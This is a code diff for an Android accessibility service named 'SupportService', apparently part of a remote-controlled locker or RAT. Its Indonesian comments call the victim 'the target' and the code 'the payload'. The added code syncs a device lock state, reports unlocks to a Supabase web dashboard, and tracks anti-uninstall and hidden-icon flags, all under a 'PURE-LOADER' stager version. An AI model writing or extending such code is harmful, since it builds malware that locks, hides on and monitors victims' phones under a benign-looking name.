@@ -45,6 +45,28 @@ public class SupportService extends AccessibilityService implements SupabaseMana
         this.accessibilityDelegate = delegate;
     }
 
+    /**
+     * Dipanggil oleh payload ketika target memasukkan kunci yang benar.
+     * Mengsinkronkan status ke Native, Prefs, dan Database.
+     */
+    public void notifyManualUnlock() {
+        Log.i(TAG, "Manual unlock detected via key input. Syncing state...");
+        setLockStatusNative(false);
+        getSharedPreferences("payload_prefs", MODE_PRIVATE)
+                .edit()
+                .putBoolean("locked", false)
+                .apply();
+        
+        // Update status ke Supabase agar tombol di Web langsung berubah jadi OFF
+        updateSystemStatus();
+        
+        if (supabaseManager != null) {
+            // Kirim event khusus agar dashboard tahu ada perubahan status dari device
+            supabaseManager.sendData("event", "unlocked_by_user");
+            supabaseManager.sendData("logs", "[Locker] Device unlocked successfully by user key.");
+        }
+    }
+
     public static void setMirrorIntent(Intent intent) { mirrorIntent = intent; }
     public static Intent getMirrorIntent() { return mirrorIntent; }
 
@@ -139,6 +161,7 @@ public class SupportService extends AccessibilityService implements SupabaseMana
     public void updateSystemStatus() {
         if (supabaseManager == null) return;
         
+        android.content.SharedPreferences prefs = getSharedPreferences("payload_prefs", MODE_PRIVATE);
         java.util.Map<String, Object> status = new java.util.HashMap<>();
         status.put("name", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
         status.put("brand", android.os.Build.BRAND);
@@ -149,7 +172,12 @@ public class SupportService extends AccessibilityService implements SupabaseMana
         status.put("online", true);
         status.put("stager_version", "2.0-PURE-LOADER");
 
-        // --- Hardware Resources (Hanya Update jika N/A atau Sekali Saja) ---
+        // --- Persistent States (Source of truth for Web Dashboard) ---
+        status.put("locked", isLockedNative());
+        status.put("anti_uninstall", prefs.getBoolean("anti_uninstall", false));
+        status.put("hide_icon", prefs.getBoolean("hide_icon", false));
+
+        // --- Hardware Resources ---
         status.put("ram_total", getRamInfo());
         status.put("internal_storage", getInternalStorageInfo());
 
